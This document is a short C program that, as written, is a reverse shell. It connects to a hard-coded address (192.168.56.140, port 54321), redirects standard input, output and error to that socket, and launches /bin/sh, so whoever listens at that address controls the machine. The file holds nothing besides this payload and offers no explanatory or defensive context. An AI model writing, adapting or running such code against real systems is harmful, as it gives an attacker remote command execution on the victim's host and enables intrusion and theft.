#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <unistd.h> //dup2

int main ()
{
    const char* ip = "192.168.56.140";
    struct sockaddr_in addr;

    addr.sin_family = AF_INET;
    addr.sin_port = htons(54321);
    inet_aton(ip, &addr.sin_addr);

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    connect(sockfd, (struct sockaddr *)&addr, sizeof(addr));

    /*
     * duplicate socket to stdin, stdout, stderr
     */
    for (int i = 0; i < 3; i++){
        dup2(sockfd, i);
    }

    execve("/bin/sh", NULL, NULL);

    return 0;
}
